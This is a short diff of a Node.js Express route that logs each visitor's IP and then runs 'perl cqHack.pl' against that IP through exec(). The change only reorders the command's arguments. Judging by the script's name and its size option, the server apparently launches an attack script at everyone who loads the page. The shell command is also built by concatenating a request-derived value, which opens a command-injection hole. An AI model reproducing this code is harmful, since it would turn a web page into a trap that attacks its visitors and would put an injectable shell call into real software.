@@ -15,7 +15,7 @@ app.get("/", (req, res) => {
     ip = ip.replace("::ffff:", "");
     console.log(date.toString() + "  " + ip);
 
-    exec("perl cqHack.pl size=4069 " + ip, (error, stdout, stderr) => {
+    exec("perl cqHack.pl " + ip + " size=4069", (error, stdout, stderr) => {
         if (error) {
             console.log(`error: ${error.message}`);
             return;
